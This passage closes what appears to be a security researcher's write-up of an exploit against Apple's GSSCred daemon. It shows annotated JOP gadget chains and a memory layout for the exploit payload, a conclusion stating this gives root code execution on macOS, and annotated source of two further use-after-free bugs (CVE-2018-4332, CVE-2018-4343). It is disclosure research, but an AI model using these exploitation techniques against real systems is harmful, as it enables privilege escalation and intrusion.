
	;; If the conditional is true, we execute from
	;; JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP. This JOP stack sends the Mach message
	;; and then runs the JOP_STACK_INCREMENT_PORT_AND_BRANCH stack again.

	MOV_X0_X27__BLR_X8 (common):
			mov x0, x27
			blr x8
		x0 = REGION_MACH_MESSAGE
		pc = LDP_X3_X2_X2__BR_X3
		pc = BLR_X23__MOV_X0_X21__BLR_X25

	BLR_X23__MOV_X0_X21__BLR_X25 (MediaToolbox):
			blr x23
			mov x0, x21
			blr x25
		pc = mach_msg_send
		x0 = PORT_INCREMENT
		pc = LDP_X8_X2_X19__BLR_X8

	;; If the conditional is false, we execute from JOP_STACK_FINALIZE. This JOP
	;; stack is responsible for ending execution of the exploit payload in a way
	;; that leaves the GSSCred process running.
	;;
	;; Ideally we'd do one of two things:
	;; 	- Return to the caller in a consistent state. The caller would then
	;; 	  continue running as usual and release associated resources.
	;; 	- Cancel or suspend the current thread. This prevents further
	;; 	  corruption and resource consumption, but leaks currently consumed
	;; 	  resources.
	;;
	;; Unfortunately fixing the corruption seems difficult at best and
	;; pthread_exit() aborts in the current context. The only remaining good option
	;; is a live wait. For simplicity we simply enter an infinite loop.

	LDR_X8_X19_10__BLR_X8 (common):
			ldr x8, [x19, #0x10]
			blr x8
		x8 = BLR_X8
		pc = BLR_X8

	BLR_X8 (common):
			blr x8
		pc = BLR_X8

We can lay this program out memory as follows:

	     0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
	    +----------------------------------------------------------------+
	  0 |AACCCCCCAAAA    KKKKKKKKLLLL    DDDDDDBBBBBBBBBBBBBBBBBB    BB  |
	100 |BB      JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ            |
	    +----------------------------------------------------------------+
	     0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f

	    A  =  REGION_ARG1                           =  0 - 30  @   0
	    B  =  REGION_JMPBUF                         =  0 - 70  @  98
	    C  =  REGION_X19                            =  0 - 18  @   8
	    D  =  REGION_MACH_MESSAGE                   =  0 - 18  @  78 + REGION_X19

	    J  =  JOP_STACK_INCREMENT_PORT_AND_BRANCH   =  0 - b0  @ 120
	    K  =  JOP_STACK_SEND_MACH_MESSAGE_AND_LOOP  =  0 - 20  @  40
	    L  =  JOP_STACK_FINALIZE                    =  0 - 10  @  60


Conclusion
---------------------------------------------------------------------------------------------------

On macOS, GSSCred runs outside of any sandbox, meaning once we get the task port we have
unsandboxed arbitrary code execution as root.

On iOS the story is a bit different. The GSSCred process enters the `com.apple.GSSCred` sandbox
immediately on startup, which restricts it from doing most interesting things. The kernel attack
surface from within the GSSCred sandbox does not appear significantly wider than from within the
container sandbox. Thus, GSSCred may be a stepping-stone on a longer journey to unsandboxed code
execution.


Bonus bugs
---------------------------------------------------------------------------------------------------

In addition to the main vulnerability caused by unexpected parallelism, GSSCred suffered from a few
other issues as well. None of these seemed promising enough for me to want to invest the effort
developing an exploit, but I'll explain them here for completeness.

The first bonus bug is [CVE-2018-4332][iOS 12], a double-`CFRelease()` in the `do_CreateCred()`
function:

{% highlight C %}
static void
do_CreateCred(struct peer *peer, xpc_object_t request, xpc_object_t reply)
{
    CFMutableDictionaryRef attrs = NULL;
    HeimCredRef cred = NULL;
    CFUUIDRef uuid = NULL;
    bool hasACL = false;
    CFErrorRef error = NULL;
    CFBooleanRef lead;

    /** 1. We create an attributes CFDictionary based on the request. All items should have
           refcount 1. **/
    CFDictionaryRef attributes = HeimCredMessageCopyAttributes(request, "attributes", CFDictionaryGetTypeID());
    if (attributes == NULL)
	goto out;

    if (!validateObject(attributes, &error)) {
	addErrorToReply(reply, error);
	goto out;
    }

    /* check if we are ok to link into this cred-tree */
    /** 2. The uuid object is borrowed from the attributes dictionary; no additional reference is
           added. **/
    uuid = CFDictionaryGetValue(attributes, kHEIMAttrParentCredential);
    /** 3. If uuid is non-NULL and checkACLInCredentialChain() returns false, then we branch to
           out. **/
    if (uuid != NULL && !checkACLInCredentialChain(peer, uuid, &hasACL))
	goto out;

    uuid = CFDictionaryGetValue(attributes, kHEIMAttrUUID);
    if (uuid) {
	CFRetain(uuid);

	if (CFGetTypeID(uuid) != CFUUIDGetTypeID())
	    goto out;

	if (CFDictionaryGetValue(peer->session->items, uuid) != NULL)
	    goto out;
	
    } else {
	uuid = CFUUIDCreate(NULL);
	if (uuid == NULL)
	    goto out;
    }
    cred = HeimCredCreateItem(uuid);
    if (cred == NULL)
	goto out;

    ...

out:
    CFRELEASE_NULL(attrs);
    /** 4. The attributes dict is freed. All the attributes were created with refcount 1, so they
           all get freed. In particular, uuid is freed, so the uuid variable is a dangling
           pointer. **/
    CFRELEASE_NULL(attributes);
    CFRELEASE_NULL(cred);
    /** 5. We CFRelease() uuid again, even though it was already freed above. **/
    CFRELEASE_NULL(uuid);
    CFRELEASE_NULL(error);
}
{% endhighlight %}

The problem is that `uuid` points to a borrowed value in some places and an owned value in others,
and yet in both cases it is deallocated with `CFRelease()`.

The second bonus bug is [CVE-2018-4343][iOS 12], another use-after-free, this time in the
function `do_Move()`:

{% highlight C %}
static void
do_Move(struct peer *peer, xpc_object_t request, xpc_object_t reply)
{
    /** 1. from and to are fully controlled UUID objects deserialized from the XPC request. **/
    CFUUIDRef from = HeimCredMessageCopyAttributes(request, "from", CFUUIDGetTypeID());
    CFUUIDRef to = HeimCredMessageCopyAttributes(request, "to", CFUUIDGetTypeID());

    if (from == NULL || to == NULL) {
	CFRELEASE_NULL(from);
	CFRELEASE_NULL(to);
	return;
    }

    if (!checkACLInCredentialChain(peer, from, NULL) || !checkACLInCredentialChain(peer, to, NULL)) {
	CFRelease(from);
	CFRelease(to);
	return;
    }

    /** 2. credfrom and credto are HeimCredRef objects looked up by the from and to UUIDs.
           CFDictionaryGetValue() returns the objects without adding a reference. Note that if
           the from and to UUIDs are the same, then credfrom and credto will both reference the
           same object. **/
    HeimCredRef credfrom = (HeimCredRef)CFDictionaryGetValue(peer->session->items, from);
    HeimCredRef credto = (HeimCredRef)CFDictionaryGetValue(peer->session->items, to);

    if (credfrom == NULL) {
	CFRelease(from);
	CFRelease(to);
	return;
    }

    /** 3. credfrom is removed from the dictionary. Since there was only one reference
           outstanding, this causes credfrom to be freed. **/
    CFMutableDictionaryRef newattrs = CFDictionaryCreateMutableCopy(NULL, 0, credfrom->attributes);
    CFDictionaryRemoveValue(peer->session->items, from);
    credfrom = NULL;

    CFDictionarySetValue(newattrs, kHEIMAttrUUID, to);

    /** 4. At this point we check credto. If credfrom and credto refer to the same object, then
           credto is a non-NULL pointer to the freed HeimCredRef object. **/
    if (credto == NULL) {
	...

    } else {
        /** 5. Now we dereference credto, passing a value read from freed memory as a
               CFDictionaryRef object to CFDictionaryGetValue(). **/
	CFUUIDRef parentUUID = CFDictionaryGetValue(credto->attributes, kHEIMAttrParentCredential);
	...
    }

    ...
}
{% endhighlight %}

The problem here is that the code does not consider the case when a `"move"` request attempts to
move a credential to the same UUID as it already has. In this particular case, removing the old
credential from the dictionary will also free the `credto` object before it is accessed.

